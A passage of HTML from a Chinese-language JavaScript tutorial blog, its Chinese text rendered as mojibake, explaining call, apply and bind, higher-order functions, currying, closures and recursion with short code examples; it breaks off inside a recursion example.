id="æ”¹å˜å‡½æ•°å†…éƒ¨-this-æŒ‡å‘"><a href="#æ”¹å˜å‡½æ•°å†…éƒ¨-this-æŒ‡å‘" class="headerlink" title="æ”¹å˜å‡½æ•°å†…éƒ¨ this æŒ‡å‘"></a><strong>æ”¹å˜</strong>å‡½æ•°<strong>å†…éƒ¨</strong> <strong>this</strong> <strong>æŒ‡å‘</strong></h2><p>JavaScript ä¸ºæˆ‘ä»¬ä¸“é—¨æä¾›äº†ä¸€äº›å‡½æ•°æ–¹æ³•æ¥å¸®æˆ‘ä»¬æ›´ä¼˜é›…çš„å¤„ç†å‡½æ•°å†…éƒ¨ this çš„æŒ‡å‘é—®é¢˜ï¼Œå¸¸ç”¨çš„æœ‰ bind()ã€call()ã€apply() ä¸‰ç§æ–¹æ³•ã€‚</p><h3 id="call-æ–¹æ³•"><a href="#call-æ–¹æ³•" class="headerlink" title="call æ–¹æ³•"></a>call <strong>æ–¹æ³•</strong></h3><p>call() æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ã€‚ç®€å•ç†è§£ä¸ºè°ƒç”¨å‡½æ•°çš„æ–¹å¼ï¼Œä½†æ˜¯å®ƒå¯ä»¥æ”¹å˜å‡½æ•°çš„ this æŒ‡å‘ã€‚</p><p><code>fun.call(thisArg, arg1, arg2, ...) </code></p><ol><li><p>thisArgï¼šåœ¨ fun å‡½æ•°è¿è¡Œæ—¶æŒ‡å®šçš„ this å€¼</p></li><li><p>arg1ï¼Œarg2ï¼šä¼ é€’çš„å…¶ä»–å‚æ•°</p></li><li><p>è¿”å›å€¼å°±æ˜¯å‡½æ•°çš„è¿”å›å€¼ï¼Œå› ä¸ºå®ƒå°±æ˜¯è°ƒç”¨å‡½æ•°</p></li><li><p>å› æ­¤å½“æˆ‘ä»¬æƒ³æ”¹å˜ this æŒ‡å‘ï¼ŒåŒæ—¶æƒ³è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ callï¼Œæ¯”å¦‚ç»§æ‰¿</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call çš„ä¸»è¦ä½œç”¨å¯ä»¥å®ç°ç»§æ‰¿</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age, sex</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.sex = sex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, sex</span>) </span>&#123;</span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age, sex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;ç”·&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son);</span><br></pre></td></tr></table></figure></li></ol><h3 id="apply-æ–¹æ³•"><a href="#apply-æ–¹æ³•" class="headerlink" title="apply æ–¹æ³•"></a><strong>apply</strong> <strong>æ–¹æ³•</strong></h3><p>apply() æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚ç®€å•ç†è§£ä¸ºè°ƒç”¨å‡½æ•°çš„æ–¹å¼ï¼Œä½†æ˜¯å®ƒå¯ä»¥æ”¹å˜å‡½æ•°çš„ this æŒ‡å‘ã€‚</p><p><code>fun.apply(thisArg, [argsArray])</code> </p><ol><li><p>thisArgï¼šåœ¨funå‡½æ•°è¿è¡Œæ—¶æŒ‡å®šçš„ this å€¼</p></li><li><p>argsArrayï¼šä¼ é€’çš„å€¼ï¼Œå¿…é¡»åŒ…å«åœ¨<strong>æ•°ç»„</strong>é‡Œé¢</p></li><li><p>è¿”å›å€¼å°±æ˜¯å‡½æ•°çš„è¿”å›å€¼ï¼Œå› ä¸ºå®ƒå°±æ˜¯è°ƒç”¨å‡½æ•°</p></li><li><p>å› æ­¤ apply ä¸»è¦è·Ÿæ•°ç»„æœ‰å…³ç³»ï¼Œæ¯”å¦‚ä½¿ç”¨ Math.max() æ±‚æ•°ç»„çš„æœ€å¤§å€¼</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// apply çš„ä¸»è¦åº”ç”¨ æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ apply å€ŸåŠ©äºæ•°å­¦å†…ç½®å¯¹è±¡æ±‚æ•°ç»„æœ€å¤§å€¼ </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// var max = Math.max.apply(null, arr); nullåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æœ‰é—®é¢˜</span></span><br><span class="line"><span class="keyword">var</span> max = <span class="built_in">Math</span>.max.apply(<span class="built_in">Math</span>, arr);</span><br><span class="line"><span class="keyword">var</span> min = <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, arr);</span><br><span class="line"><span class="built_in">console</span>.log(max, min); <span class="comment">// 99 1</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="bind-æ–¹æ³•"><a href="#bind-æ–¹æ³•" class="headerlink" title="bind æ–¹æ³•"></a><strong>bind</strong> <strong>æ–¹æ³•</strong></h3><p>bind() æ–¹æ³•ä¸ä¼šè°ƒç”¨å‡½æ•°ã€‚ä½†æ˜¯èƒ½æ”¹å˜å‡½æ•°å†…éƒ¨this æŒ‡å‘ </p><p><code>fun.bind(thisArg, arg1, arg2, ...) </code></p><ol><li><p>thisArgï¼šåœ¨ fun å‡½æ•°è¿è¡Œæ—¶æŒ‡å®šçš„ this å€¼</p></li><li><p>arg1ï¼Œarg2ï¼šä¼ é€’çš„å…¶ä»–å‚æ•°</p></li><li><p>è¿”å›ç”±æŒ‡å®šçš„ this å€¼å’Œåˆå§‹åŒ–å‚æ•°æ”¹é€ çš„<strong>åŸå‡½æ•°æ‹·è´</strong></p></li><li><p>å› æ­¤å½“æˆ‘ä»¬åªæ˜¯æƒ³æ”¹å˜ this æŒ‡å‘ï¼Œå¹¶ä¸”ä¸æƒ³è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ bind</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  å¦‚æœæœ‰çš„å‡½æ•°æˆ‘ä»¬ä¸éœ€è¦ç«‹å³è°ƒç”¨,ä½†æ˜¯åˆæƒ³æ”¹å˜è¿™ä¸ªå‡½æ•°å†…éƒ¨çš„thisæŒ‡å‘æ­¤æ—¶ç”¨bind</span></span><br><span class="line"><span class="comment">//  æˆ‘ä»¬æœ‰ä¸€ç»„æŒ‰é’®,å½“æˆ‘ä»¬ç‚¹å‡»äº†æŸä¸ªæŒ‰é’®ä¹‹å,å°±ç¦ç”¨è¿™ä¸ªæŒ‰é’®,2ç§’é’Ÿä¹‹åå¼€å¯è¿™ä¸ªæŒ‰é’®</span></span><br><span class="line"><span class="keyword">var</span> btns = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; btns.length; i++) &#123;</span><br><span class="line">    btns[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.disabled = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;.bind(<span class="built_in">this</span>), <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸‹é¢å†…å®¹è§ç¬”è®°ï¼ˆä¸€ï¼‰</p></blockquote></li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">        <span class="comment">// å»é™¤äº†ä¹‹å‰ var that = this ï¼Œé€šè¿‡ bind ç»‘å®šthisæŒ‡å‘</span></span><br><span class="line">        <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab.bind(<span class="built_in">this</span>.lis[i],<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab.bind(<span class="built_in">this</span>.remove[i],<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// that å½¢å‚ å³è°ƒç”¨æ—¶ä¼ å…¥çš„ this æŒ‡å‘ï¼Œthis æŒ‡å‘è°ƒç”¨æ—¶ä¼ å…¥çš„ this.lis[i] </span></span><br><span class="line"><span class="function"><span class="title">toggleTab</span>(<span class="params">that</span>)</span> &#123;</span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">    that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h3><p><strong>ç›¸åŒç‚¹</strong></p><p>éƒ½å¯ä»¥æ”¹å˜å‡½æ•°å†…éƒ¨çš„thisæŒ‡å‘.</p><p><strong>åŒºåˆ«ç‚¹</strong></p><p>1.call å’Œ apply ä¼šè°ƒç”¨å‡½æ•°, å¹¶ä¸”æ”¹å˜å‡½æ•°å†…éƒ¨thisæŒ‡å‘.</p><p>2.call å’Œ apply ä¼ é€’çš„å‚æ•°ä¸ä¸€æ ·, call ä¼ é€’å‚æ•° aru1, aru2..å½¢å¼ apply å¿…é¡»æ•°ç»„å½¢å¼[arg]</p><p>3.bind ä¸ä¼šè°ƒç”¨å‡½æ•°, å¯ä»¥æ”¹å˜å‡½æ•°å†…éƒ¨thisæŒ‡å‘.</p><p><strong>ä¸»è¦åº”ç”¨åœºæ™¯</strong>**</p><p>1.call ç»å¸¸åšç»§æ‰¿. </p><p>2.apply ç»å¸¸è·Ÿæ•°ç»„æœ‰å…³ç³». æ¯”å¦‚å€ŸåŠ©äºæ•°å­¦å¯¹è±¡å®ç°æ•°ç»„æœ€å¤§å€¼æœ€å°å€¼</p><p>3.bind ä¸è°ƒç”¨å‡½æ•°,ä½†æ˜¯è¿˜æƒ³æ”¹å˜thisæŒ‡å‘. æ¯”å¦‚æ”¹å˜å®šæ—¶å™¨å†…éƒ¨çš„thisæŒ‡å‘. </p><hr><h1 id="é«˜é˜¶å‡½æ•°"><a href="#é«˜é˜¶å‡½æ•°" class="headerlink" title="é«˜é˜¶å‡½æ•°"></a>é«˜é˜¶å‡½æ•°</h1><p><strong>é«˜é˜¶å‡½æ•°</strong>æ˜¯å¯¹å…¶ä»–å‡½æ•°è¿›è¡Œæ“ä½œçš„å‡½æ•°ï¼Œå®ƒæ¥æ”¶å‡½æ•°ä½œä¸ºå‚æ•°æˆ–å°†å‡½æ•°ä½œä¸ºè¿”å›å€¼è¾“å‡ºã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç¬¬ä¸€ç§å†™æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">    callback&amp;&amp;callback();</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">&#x27;hi&#x27;</span>)&#125;</span><br><span class="line"><span class="comment">// ç¬¬äºŒç§å†™æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶fn å°±æ˜¯ä¸€ä¸ªé«˜é˜¶å‡½æ•°ã€‚å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼ŒåŒæ ·å¯ä»¥ä½œä¸ºå‚æ•°ï¼Œä¼ é€’ç»™å¦å¤–ä¸€ä¸ªå‚æ•°ä½¿ç”¨ã€‚ æœ€å…¸å‹çš„å°±æ˜¯ä½œä¸ºå›è°ƒå‡½æ•°ã€‚åŒç†å‡½æ•°ä¹Ÿå¯ä»¥ä½œä¸ºè¿”å›å€¼ä¼ é€’å›æ¥ã€‚</p><h2 id="å‡½æ•°çš„æŸ¯é‡ŒåŒ–"><a href="#å‡½æ•°çš„æŸ¯é‡ŒåŒ–" class="headerlink" title="å‡½æ•°çš„æŸ¯é‡ŒåŒ–"></a><strong>å‡½æ•°çš„æŸ¯é‡ŒåŒ–</strong></h2><p>é€šè¿‡å‡½æ•°è°ƒç”¨ç»§ç»­è¿”å›å‡½æ•°çš„æ–¹å¼ï¼Œå®ç°å¤šæ¬¡æ¥æ”¶å‚æ•°æœ€åç»Ÿä¸€å¤„ç†çš„å‡½æ•°ç¼–ç å½¢å¼ï¼ˆæ¯”å¦‚Reactå®ç°ä¼ å‚çš„å›è°ƒå‡½æ•°ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">b</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function">(<span class="params">c</span>)=&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a+b+c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sum(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h1><h2 id="å˜é‡ä½œç”¨åŸŸ"><a href="#å˜é‡ä½œç”¨åŸŸ" class="headerlink" title="å˜é‡ä½œç”¨åŸŸ"></a><strong>å˜é‡ä½œç”¨åŸŸ</strong></h2><p>å˜é‡æ ¹æ®ä½œç”¨åŸŸçš„ä¸åŒåˆ†ä¸ºä¸¤ç§ï¼šå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ã€‚</p><ol><li> å‡½æ•°å†…éƒ¨å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡ã€‚</li><li> å‡½æ•°å¤–éƒ¨ä¸å¯ä»¥ä½¿ç”¨å±€éƒ¨å˜é‡ã€‚</li><li> å½“å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œæœ¬ä½œç”¨åŸŸå†…çš„å±€éƒ¨å˜é‡ä¼šé”€æ¯ã€‚</li></ol><h2 id="ä»€ä¹ˆæ˜¯é—­åŒ…"><a href="#ä»€ä¹ˆæ˜¯é—­åŒ…" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åŒ…"></a><strong>ä»€ä¹ˆæ˜¯é—­åŒ…</strong></h2><p>é—­åŒ…ï¼ˆclosureï¼‰æŒ‡æœ‰æƒè®¿é—®å¦ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­å˜é‡çš„<strong>å‡½æ•°</strong>ã€‚ â€”â€“ JavaScript é«˜çº§ç¨‹åºè®¾è®¡</p><p>ç®€å•ç†è§£å°±æ˜¯ ï¼Œä¸€ä¸ªä½œç”¨åŸŸå¯ä»¥è®¿é—®å¦å¤–ä¸€ä¸ªå‡½æ•°å†…éƒ¨çš„å±€éƒ¨å˜é‡ã€‚ </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;    <span class="comment">// fn1 å°±æ˜¯é—­åŒ…å‡½æ•°ï¼Œé—­åŒ…å°±æ˜¯å…¸å‹çš„é«˜é˜¶å‡½æ•°</span></span><br><span class="line">ã€€ã€€ã€€<span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line">ã€€ã€€ã€€<span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ <span class="built_in">console</span>.log(num); <span class="comment">// 10</span></span><br><span class="line">ã€€ã€€ã€€&#125;</span><br><span class="line">     fn2()</span><br><span class="line">&#125;</span><br><span class="line">fn1();</span><br></pre></td></tr></table></figure><h2 id="åœ¨-chrome-ä¸­è°ƒè¯•é—­åŒ…"><a href="#åœ¨-chrome-ä¸­è°ƒè¯•é—­åŒ…" class="headerlink" title="åœ¨ chrome ä¸­è°ƒè¯•é—­åŒ…"></a><strong>åœ¨ chrome ä¸­</strong>è°ƒè¯•é—­åŒ…</h2><ol><li>æ‰“å¼€æµè§ˆå™¨ï¼ŒæŒ‰ F12 é”®å¯åŠ¨ chrome è°ƒè¯•å·¥å…·ã€‚</li><li>è®¾ç½®æ–­ç‚¹ã€‚</li><li>æ‰¾åˆ° Scope é€‰é¡¹ï¼ˆScope ä½œç”¨åŸŸçš„æ„æ€ï¼‰ã€‚</li><li>å½“æˆ‘ä»¬é‡æ–°åˆ·æ–°é¡µé¢ï¼Œä¼šè¿›å…¥æ–­ç‚¹è°ƒè¯•ï¼ŒScope é‡Œé¢ä¼šæœ‰ä¸¤ä¸ªå‚æ•°ï¼ˆglobal å…¨å±€ä½œç”¨åŸŸã€local å±€éƒ¨ä½œç”¨åŸŸï¼‰ã€‚</li><li>å½“æ‰§è¡Œåˆ° fn2() æ—¶ï¼ŒScope é‡Œé¢ä¼šå¤šä¸€ä¸ª Closure å‚æ•° ï¼Œè¿™å°±è¡¨æ˜äº§ç”Ÿäº†é—­åŒ…ã€‚</li></ol><h2 id="é—­åŒ…çš„ä½œç”¨"><a href="#é—­åŒ…çš„ä½œç”¨" class="headerlink" title="é—­åŒ…çš„ä½œç”¨"></a><strong>é—­åŒ…çš„ä½œç”¨</strong></h2><p><strong>æé—®ï¼šæˆ‘ä»¬æ€ä¹ˆèƒ½åœ¨ fn() å‡½æ•°å¤–é¢è®¿é—® fn() ä¸­çš„å±€éƒ¨å˜é‡ num å‘¢ ï¼Ÿ</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;ã€€ã€€ã€€ã€€</span><br><span class="line">   <span class="keyword">var</span> num = <span class="number">10</span>;ã€€ã€€ã€€ã€€</span><br><span class="line">   <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> </span>&#123;ã€€ã€€ã€€ <span class="comment">// è¿”å›ä¸€ä¸ªåŒ¿åå‡½æ•°</span></span><br><span class="line">        <span class="built_in">console</span>.log(num); <span class="comment">// 10         ã€€ã€€ã€€ã€€</span></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">var</span> f = fn();</span><br><span class="line"> <span class="comment">// ç±»ä¼¼äº</span></span><br><span class="line"> <span class="comment">// var f = function() &#123;</span></span><br><span class="line"> <span class="comment">//         console.log(num);</span></span><br><span class="line"> <span class="comment">//     &#125;</span></span><br><span class="line"> f() <span class="comment">// 10 è°ƒç”¨ f ï¼Œå¾—åˆ° fn å†…éƒ¨çš„å˜é‡ num</span></span><br></pre></td></tr></table></figure><h2 id="é—­åŒ…æ¡ˆä¾‹"><a href="#é—­åŒ…æ¡ˆä¾‹" class="headerlink" title="é—­åŒ…æ¡ˆä¾‹"></a><strong>é—­åŒ…æ¡ˆä¾‹</strong></h2><h3 id="å¾ªç¯æ³¨å†Œç‚¹å‡»äº‹ä»¶"><a href="#å¾ªç¯æ³¨å†Œç‚¹å‡»äº‹ä»¶" class="headerlink" title="å¾ªç¯æ³¨å†Œç‚¹å‡»äº‹ä»¶"></a>å¾ªç¯æ³¨å†Œç‚¹å‡»äº‹ä»¶</h3><blockquote><p>å­˜åœ¨å†…å­˜æ³„æ¼ï¼Œæ‰€ä»¥é—­åŒ…ä¸ä¸€å®šéƒ½æœ‰ç”¨ ï¼ˆè‹¥ä¸ç‚¹å‡»ï¼Œiä¸ä¼šé”€æ¯ï¼‰</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨é—­åŒ…çš„æ–¹å¼å¾—åˆ°å½“å‰å°li çš„ç´¢å¼•å·</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.length; i++) &#123;</span><br><span class="line">    <span class="comment">// åˆ©ç”¨forå¾ªç¯åˆ›å»ºäº†4ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°</span></span><br><span class="line">    <span class="comment">// ç«‹å³æ‰§è¡Œå‡½æ•°ä¹Ÿæˆä¸ºå°é—­åŒ…å› ä¸ºç«‹å³æ‰§è¡Œå‡½æ•°é‡Œé¢çš„ä»»ä½•ä¸€ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨å®ƒçš„iè¿™å˜é‡</span></span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// console.log(i);</span></span><br><span class="line">        lis[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¾ªç¯ä¸­çš„-setTimeout"><a href="#å¾ªç¯ä¸­çš„-setTimeout" class="headerlink" title="å¾ªç¯ä¸­çš„ setTimeout()"></a>å¾ªç¯ä¸­çš„ setTimeout()</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é—­åŒ…åº”ç”¨--3ç§’é’Ÿä¹‹å,æ‰“å°æ‰€æœ‰liå…ƒç´ çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">var</span> lis = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.nav&#x27;</span>).querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.length; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(lis[i].innerHTML);</span><br><span class="line">        &#125;, <span class="number">3000</span>)</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€è€ƒé¢˜"><a href="#æ€è€ƒé¢˜" class="headerlink" title="æ€è€ƒé¢˜"></a>æ€è€ƒé¢˜</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ€è€ƒé¢˜ 1ï¼š æ²¡æœ‰äº§ç”Ÿé—­åŒ…(æœªè®¿é—®å‡½æ•°å†…å˜é‡)</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;The Window&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;My Object&quot;</span>,</span><br><span class="line">    <span class="attr">getNameFunc</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object.getNameFunc()()) <span class="comment">// The Window</span></span><br><span class="line"><span class="comment">// å±•å¼€å°±ç±»ä¼¼äº</span></span><br><span class="line"><span class="keyword">var</span> f = object.getNameFunc();</span><br><span class="line"><span class="comment">// this åœ¨åŒ¿åå‡½æ•°é‡Œé¢ï¼ŒæŒ‡å‘ window</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line">f()</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ€è€ƒé¢˜ 2ï¼š äº§ç”Ÿäº†é—­åŒ…</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;The Window&quot;</span>;ã€€ã€€</span><br><span class="line"><span class="keyword">var</span> object = &#123;ã€€ã€€ã€€ã€€</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;My Object&quot;</span>,</span><br><span class="line">    <span class="attr">getNameFunc</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> that.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object.getNameFunc()()) <span class="comment">// My Object</span></span><br></pre></td></tr></table></figure><h1 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h1><h2 id="ä»€ä¹ˆæ˜¯é€’å½’"><a href="#ä»€ä¹ˆæ˜¯é€’å½’" class="headerlink" title="ä»€ä¹ˆæ˜¯é€’å½’"></a>ä»€ä¹ˆæ˜¯é€’å½’</h2><p>å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨å†…éƒ¨å¯ä»¥è°ƒç”¨å…¶æœ¬èº«ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å°±æ˜¯é€’å½’å‡½æ•°ã€‚</p><p>ç”±äºé€’å½’å¾ˆå®¹æ˜“å‘ç”Ÿâ€œæ ˆæº¢å‡ºâ€é”™è¯¯ï¼ˆstack overflowï¼‰ï¼Œæ‰€ä»¥å¿…é¡»è¦åŠ é€€å‡ºæ¡ä»¶ <strong>return</strong>ã€‚</p><h2 id="åˆ©ç”¨é€’å½’éå†æ•°æ®"><a href="#åˆ©ç”¨é€’å½’éå†æ•°æ®" class="headerlink" title="åˆ©ç”¨é€’å½’éå†æ•°æ®"></a><strong>åˆ©ç”¨é€’å½’éå†æ•°æ®</strong></h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;å®¶ç”µ&#x27;</span>,</span><br><span class="line">    <span class="attr">goods</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="attr">gname</span>: <span class="string">&#x27;å†°ç®±&#x27;</span>,</span><br><span class="line">        <span class="attr">goods</span>: [&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">111</span>,</span><br><span class="line">            <span class="attr">gname</span>: <span class="string">&#x27;æµ·å°”&#x27;</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">112</span>,</span><br><span class="line">            <span class="attr">gname</span>: <span class="string">&#x27;ç¾çš„&#x27;</span></span><br><span class="line">        &#125;, ]</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">12</span>,</span><br><span class="line">        <span class="attr">gname</span>: <span class="string">&#x27;æ´—è¡£æœº&#x27;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;æœé¥°&#x27;</span></span><br><span class="line">&#125;];</span><br><span class="line"><span class="comment">// æˆ‘ä»¬æƒ³è¦åšè¾“å…¥idå·,å°±å¯ä»¥è¿”å›çš„æ•°æ®å¯¹è±¡</span></span><br><span class="line"><span class="comment">// 1. åˆ©ç”¨ forEach å»éå†é‡Œé¢çš„æ¯ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getID</span>(<span class="params">json, id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">    json.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.id == id) &#123;</span><br><span class="line">            o = item;</span><br><span class="line">            <span class="comment">// 2. 